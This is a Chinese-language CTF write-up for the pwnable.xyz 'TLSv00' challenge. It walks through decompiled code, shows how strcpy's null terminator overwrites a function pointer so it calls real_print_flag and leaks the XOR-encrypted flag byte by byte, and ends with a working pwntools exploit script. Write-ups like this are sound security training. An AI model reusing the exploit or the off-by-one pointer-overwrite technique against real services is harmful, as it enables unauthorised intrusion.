---
title: pwnable-TLSv00
date: 2019-12-21 10:56:50
tags: 
- pwn
- pwnable.xyz
---

# pwnable.xyz TLSv00

### 0x1 分析

老样子，看一看ELF的安全设置：

![](https://i.loli.net/2019/12/21/iZveS7pUhYbmWsF.png)

貌似只能从格式化字符串的方向入手了。

那就看一下`main`函数吧。

```c
// local variable allocation has failed, the output may be wrong!
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  signed int v3; // eax
  unsigned int v4; // ST0C_4

  setup(*(_QWORD *)&argc, argv, envp);
  puts("Muahaha you thought I would never make a crypto chal?");
  generate_key(63LL);
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        print_menu();
        printf("> ");
        v3 = read_int32();
        if ( v3 != 2 )
          break;
        load_flag();
      }
      if ( v3 > 2 )
        break;
      if ( v3 != 1 )
        goto LABEL_12;
      printf("key len: ");
      v4 = read_int32();
      generate_key(v4);
    }
    if ( v3 == 3 )
    {
      print_flag();
    }
    else if ( v3 != 4 )
    {
LABEL_12:
      puts("Invalid");
    }
  }
}
```

我们`main`函数先生成一个`key`，我们来看一下这个函数在干什么。

```c
unsigned __int64 __fastcall generate_key(signed int a1)
{
  signed int i; // [rsp+18h] [rbp-58h]
  int fd; // [rsp+1Ch] [rbp-54h]
  char s[72]; // [rsp+20h] [rbp-50h]
  unsigned __int64 v5; // [rsp+68h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  if ( a1 > 0 && (unsigned int)a1 <= 0x40 )
  {
    memset(s, 0, 0x48uLL);
    fd = open("/dev/urandom", 0);
    if ( fd == -1 )
    {
      puts("Can't open /dev/urandom");
      exit(1);
    }
    read(fd, s, a1);
    for ( i = 0; i < a1; ++i )
    {
      while ( !s[i] )
        read(fd, &s[i], 1uLL);
    }
    strcpy(key, s);
    close(fd);
  }
  else
  {
    puts("Invalid key size");
  }
  return __readfsqword(0x28u) ^ v5;
}
```

`generate_key`函数接受指定长度的`a1`来读取文件`/dev/urandom`，然后我们发现有一个`strcpy`函数。也许可以利用一下末尾的`\x00`。

接下来`main`里有三个菜单。

当输入`1`的时候：重新指定`a1`的长度，来设置`key`的长度。

当输入`2`的时候：进入`load_flag();`函数

`load_flag`函数：

```c
int load_flag()
{
  unsigned int i; // [rsp+8h] [rbp-8h]
  int fd; // [rsp+Ch] [rbp-4h]

  fd = open("/flag", 0);
  if ( fd == -1 )
  {
    puts("Can't open flag");
    exit(1);
  }
  read(fd, flag, 0x40uLL);
  for ( i = 0; i <= 0x3F; ++i )
    flag[i] ^= key[i];
  return close(fd);
}
```

我们发现这里其实已经加载了我们需要的`flag`，但是,打妹！他被`key`加密了。

其实到这里我们已经想到了，`strcpy`可以在`key`的最后加上`\x00`，而`0`和任意`x`异或都是`x`本身，这样就可以在`\x00`这个位置读取`flag`某一位的真实数据了！

还没分析完呢。

当输入`3`的时候：调用了`print_flag`,但是你有什么用呢？！你又不打印东西！

```c
__int64 print_flag()
{
  __int64 result; // rax

  puts("WARNING: NOT IMPLEMENTED.");
  result = (unsigned __int8)do_comment;
  if ( !(_BYTE)do_comment )
  {
    printf("Wanna take a survey instead? ");
    if ( getchar() == 121 )
      do_comment = (__int64 (*)(void))f_do_comment;
    result = do_comment();
  }
  return result;
}
```

但是分析这里我们发现：

`do_comment`是个函数指针，存储的是`f_do_comment`的起始位置，另外，在查询`f_do_comment`的时候我们还发现了另外一个函数`real_print_flag`。原来打印`flag`的函数在这里。下次一定认真读一下函数表。好好看看有什么函数。

![](https://i.loli.net/2019/12/21/uxc16V97RZ3AOKH.png)

```c
int real_print_flag(){
  return printf("%s", &flag);
}
```

但是怎么调用呢？

`f_do_comment`和`real_print_flag`差了`1f` 的距离。这咋整。还有`strcpy`可以用吗啊喂！

还真可以诶！LOOK！

![](https://i.loli.net/2019/12/21/3U5htV2McyfGxpE.png)

我们`strcpy`的时候可以在第`key`的`0x41`的地方放入`\x00`啊。原来这道题的`strcpy`要这样用。这样`do_comment`存入的地址就是`real_print_flag`了。这样就可以在下一句调用`real_print_flag`了。

那思路基本也就有了。

### 0x2 思路

首先为了调用到`real_print_flag`函数，我们需要调用`generate_key()`函数来覆盖已经存入`do_comment`的`f_do_comment`地址。

接下来通过指定`key`逐位读取与`\x00`异或的`flag`某一位。达到读取flag的目的。

### 0x3 代码

```python
from pwn import *
# context.log_level="debug"
# p=process("./challenge")
p=remote("svc.pwnable.xyz", 30006)
#----------覆盖地址-------------
p.sendlineafter("> ", "3")
p.sendlineafter("? ", "y")
p.sendlineafter("> ", "1")
p.sendlineafter(": ", "64")
#----------读取flag-----------
s = ""
i = 1
try:
	while(i < 64):
		p.sendlineafter("> ", "1")
		p.sendlineafter(": ", str(i))
		p.sendlineafter("> ", "2")
		p.sendlineafter("> ", "3")
		p.sendlineafter("? ", "n")
		s += p.recv(i+1)[-1]
		i += 1
		print s
		sleep(0.5)

except Exception as e:
	print e
	print 'i = %d'%(i)

else:
	print s
	p.interactive()
```

